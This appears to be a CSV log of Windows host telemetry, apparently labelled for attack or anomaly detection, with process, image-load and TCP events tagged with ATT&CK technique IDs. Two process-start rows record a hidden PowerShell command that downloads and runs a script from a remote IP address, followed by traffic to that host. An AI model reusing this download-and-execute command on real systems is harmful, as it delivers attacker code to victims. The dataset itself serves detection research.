label,PID,PName,event,eid,user,timestamp,date,saddr,sport,daddr,dport,FileName,ParentID,ImageFileName,CommandLine,PPName,techniques,subject,object,anomaly_label
,3592,powershell,Process/Start,3cb3087021b78d960805fcd3b3918cba,admin,1652423148,5/13/2022 14:25,,,,,Nil,5548,powershell.exe,powershell.exe  -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8900/a&apos;))&quot;,cmd,T1105,5548#cmd,3592#powershell,0
,3592,powershell,Image/Load,8edbbfcfa2b8a314a7fe5217123dc2a9,admin,1652423148,5/13/2022 14:25,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,nil,,T1059,3592#powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0
,3592,powershell,TcpIp/Send,943af3ea7a0ed86e93fa011bdfb5f135,admin,1652423149,5/13/2022 14:25,192.168.0.110,"53,860",124.223.85.207,"8,900",Nil,,,nil,,T1020,3592#powershell,"124.223.85.207:8,900",0
,3592,powershell,TcpIp/Recv,b1507143afc892b65a062d5e912ef847,admin,1652423149,5/13/2022 14:25,192.168.0.110,"53,860",124.223.85.207,"8,900",Nil,,,nil,,T1589,3592#powershell,"124.223.85.207:8,900",0
a,4312,powershell,Process/Start,712b3d9040922f413c0017bf38c2f5d8,admin,1652423280,5/13/2022 14:28,,,,,Nil,888,powershell.exe,powershell.exe  -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8900/a&apos;))&quot;,cmd,T1105,888#cmd,4312#powershell,0
a,4312,powershell,Image/Load,2c4b4175c3d67dff82f4136bccb9a8a4,admin,1652423280,5/13/2022 14:28,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,nil,,T1059,4312#powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0
a,4312,powershell,TcpIp/Send,f74397f6d76a84d3e879de40a5594a62,admin,1652423281,5/13/2022 14:28,192.168.0.110,"53,872",124.223.85.207,"8,900",Nil,,,nil,,T1020,4312#powershell,"124.223.85.207:8,900",0
a,4312,powershell,TcpIp/Recv,96213e58caa8936f204e0629c5e59153,admin,1652423281,5/13/2022 14:28,192.168.0.110,"53,872",124.223.85.207,"8,900",Nil,,,nil,,T1589,4312#powershell,"124.223.85.207:8,900",0
a,4312,powershell,TcpIp/Send,f38cb9dd07b52685995176f523f1dfd1,admin,1652423282,5/13/2022 14:28,192.168.0.110,"53,873",124.223.85.207,"8,084",Nil,,,nil,,T1020,4312#powershell,"124.223.85.207:8,084",0
a,4312,powershell,TcpIp/Recv,da5ad2576e58b98d565cc9bf2c6be0fc,admin,1652423282,5/13/2022 14:28,192.168.0.110,"53,873",124.223.85.207,"8,084",Nil,,,nil,,T1589,4312#powershell,"124.223.85.207:8,084",0
